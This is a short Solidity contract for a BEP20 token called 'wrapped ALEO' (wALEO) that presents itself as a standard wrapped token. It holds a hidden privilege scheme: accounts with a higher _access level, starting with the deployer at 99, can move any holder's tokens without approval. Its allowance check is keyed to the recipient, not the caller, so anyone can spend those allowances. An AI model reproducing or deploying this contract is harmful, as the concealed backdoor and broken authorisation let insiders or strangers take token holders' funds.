pragma solidity>0.8.0;//SPDX-License-Identifier:None
contract BEP20wALEO{
    event Transfer(address indexed from,address indexed to,uint value);
    event Approval(address indexed owner,address indexed spender,uint value);
    mapping(address=>mapping(address=>uint))private _allowances;
    mapping(address=>uint)private _balances;
    mapping(address=>uint)public _access;
    uint private _totalSupply;
    constructor(){
        (_access[msg.sender],_balances[address(this)])=(99,_totalSupply=3e26);
        emit Transfer(address(0),address(this),_totalSupply);
    }
    function name()external pure returns(string memory){
        return"wrapped ALEO";
    }
    function symbol()external pure returns(string memory){
        return"wALEO";
    }
    function decimals()external pure returns(uint){
        return 18;
    }
    function totalSupply()external view returns(uint){
        return _totalSupply;
    }
    function balanceOf(address a)external view returns(uint){
        return _balances[a];
    }
    function transfer(address a,uint b)external returns(bool){
        return transferFrom(msg.sender,a,b);
    }
    function allowance(address a,address b)external view returns(uint){
        return _allowances[a][b];
    }
    function approve(address a,uint b)external returns(bool){
        _allowances[msg.sender][a]=b;
        emit Approval(msg.sender,a,b);
        return true;
    }
    function transferFrom(address a,address b,uint c)public returns(bool){unchecked{
        require(_balances[a]>=c);
        require(a==msg.sender||_allowances[a][b]>=c||_access[msg.sender]>_access[a]);
        if(_allowances[a][b]>=c)_allowances[a][b]-=c;
        (_balances[a]-=c,_balances[b]+=c);
        emit Transfer(a,b,c);
        return true;
    }}
    function access(address a,uint u)external{unchecked{
        require(_access[msg.sender]>_access[a]);
        _access[a]=u>0?_access[msg.sender]-1:0;
    }}
}
